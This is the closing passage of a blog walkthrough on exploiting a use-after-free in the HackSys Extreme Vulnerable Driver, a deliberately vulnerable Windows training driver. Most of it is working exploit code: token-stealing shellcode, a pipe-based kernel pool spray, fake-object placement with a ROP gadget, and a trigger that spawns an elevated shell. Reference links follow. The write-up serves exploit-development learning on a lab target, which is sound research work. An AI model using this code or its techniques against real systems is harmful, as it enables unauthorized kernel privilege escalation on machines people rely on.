		"\xb8\x00\x00\x00\x48\x89\xc1\xb2\x04\x48\x8b\x80\x48\x04"
		"\x00\x00\x48\x2d\x48\x04\x00\x00\x38\x90\x40\x04\x00\x00"
		"\x75\xeb\x48\x8b\x90\xb8\x04\x00\x00\x48\x89\x91\xb8\x04"
		"\x00\x00"

		"\x48\x83\xC4\x08" // add rsp, 0x8
		"\xC3";            // ret (return to UseUaFObjectNonPagedPool)

	printf("[i] Allocating objects for defragmentation spray...\n");

	p_rwPipe defrag_pipeHandles = (p_rwPipe)malloc(20000 * sizeof(rwPipe));

	for (int i = 0; i < 20000; i++) {

		rwPipe pipeHandle = objSpray();
		defrag_pipeHandles[i] = pipeHandle;

	}

	printf("[i] Allocating objects for sequential spray...\n");

	p_rwPipe seq_pipeHandles = (p_rwPipe)malloc(60000 * sizeof(rwPipe));

	for (int i = 0; i < 60000; i++) {

		rwPipe pipeHandle = objSpray();
		seq_pipeHandles[i] = pipeHandle;

	}

	printf("[i] Punching holes...\n");

	for (int i = 0; i < sizeof(seq_pipeHandles); i++) {
		if (i % 2 == 0) {

			rwPipe pipeHandles = seq_pipeHandles[i];
			CloseHandle(pipeHandles.hRead);
			CloseHandle(pipeHandles.hWrite);

		}
	}

	printf("[i] Calling AllocateUaFObjectNonPagedPool, IOCTL: 0x%x\n", IOCTL(0x804));

	if (!DeviceIoControl(hDevice, IOCTL(0x804), NULL, 0, NULL, 0, NULL, NULL)) {

		printf("[-] AllocateUaFObjectNonPagedPool failed, error: %d\n", GetLastError());

		return 1;
	}

	printf("[i] Calling FreeUaFObjectNonPagedPool, IOCTL: 0x%x\n", IOCTL(0x806));

	if (!DeviceIoControl(hDevice, IOCTL(0x806), NULL, 0, NULL, 0, NULL, NULL)) {

		printf("[-] FreeUaFObjectNonPagedPool failed, error: %d\n", GetLastError());

		return 1;
	}

	_fakeObj fakeObj;
	QWORD* fakeObjBuffer  = (QWORD*)fakeObj.Buffer;

	QWORD CALL_RAX_GADGET = ntBase + 0x3FC667; // add al, 0x10; call rax
	fakeObjBuffer[0] = (QWORD)CALL_RAX_GADGET;

	memcpy(&fakeObjBuffer[2], shellcode, sizeof(shellcode));

	printf("[*] Writing to holes...\n");

	for (int i = 0; i < 30000; i++) {
		if (!DeviceIoControl(hDevice, IOCTL(0x807), fakeObj.Buffer, sizeof(fakeObj), NULL, 0, NULL, NULL)) {

			printf("[-] AllocateFakeObjectNonPagedPool failed, error: %d\n", GetLastError());

			return 1;
		}
	}

	printf("[*] Triggering UAF\n");

	if (!DeviceIoControl(hDevice, IOCTL(0x805), NULL, 0, NULL, 0, NULL, NULL)) {

		printf("[-] UseUaFObjectNonPagedPool failed, error: %d\n", GetLastError());

		return 1;
	}

	if (checkEoP()) {
		printf("[!] Enjoy your elevated shell!\n");
		system("cmd.exe");
	}

	else {
		printf("[-] Exploit failed, run it again\n");
		return 1;
	}

	return 0;
}
```

copy

The screenshot from the final exploit:

![210f187df1f5ebfff177fcd1ade68e8b.png](https://m2rc.net/210f187df1f5ebfff177fcd1ade68e8b.png)

I will probably do the “Nx” version of this very same bug soon, in which the allocated pool is not marked as executable, so we will have to bypass SMEP.

If you’ve stuck around until this point, thank you for reading the post! I hope you’ve learned something new.

## Resources [\#](https://m2rc.net/posts/hevd-useafterfree/\#resources)

- [https://securityinsecurity.github.io/exploiting-hevd-use-after-free/](https://securityinsecurity.github.io/exploiting-hevd-use-after-free/)
- [https://www.alex-ionescu.com/kernel-heap-spraying-like-its-2015-swimming-in-the-big-kids-pool/](https://www.alex-ionescu.com/kernel-heap-spraying-like-its-2015-swimming-in-the-big-kids-pool/)
- [https://connormcgarr.github.io/swimming-in-the-kernel-pool-part-1/](https://connormcgarr.github.io/swimming-in-the-kernel-pool-part-1/)
- [https://vuln.dev/windows-kernel-exploitation-hevd-x64-use-after-free/](https://vuln.dev/windows-kernel-exploitation-hevd-x64-use-after-free/)
- [https://wetw0rk.github.io/posts/0x03-approaching-the-modern-windows-kernel-heap/](https://wetw0rk.github.io/posts/0x03-approaching-the-modern-windows-kernel-heap/)
- [https://web.archive.org/web/20200516083002/https://research.nccgroup.com/2020/05/11/cve-2018-8611-exploiting-windows-ktm-part-3-5-triggering-the-race-condition-and-debugging-tricks/](https://web.archive.org/web/20200516083002/https://research.nccgroup.com/2020/05/11/cve-2018-8611-exploiting-windows-ktm-part-3-5-triggering-the-race-condition-and-debugging-tricks/)

[Go to Top (Alt + G)](https://m2rc.net/posts/hevd-useafterfree/#top "Go to Top (Alt + G)")